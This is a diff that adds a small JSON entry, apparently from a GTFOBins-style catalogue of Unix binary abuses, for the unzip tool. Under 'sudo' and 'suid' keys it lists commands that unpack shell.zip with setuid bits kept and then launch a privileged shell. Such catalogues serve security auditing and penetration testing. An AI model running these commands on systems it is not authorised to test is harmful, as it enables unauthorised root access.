@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        
+        "code": "sudo unzip -K shell.zip\n./sh -p\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./unzip -K shell.zip\n./sh -p\n"
+      }
+    ]
+  }
+}
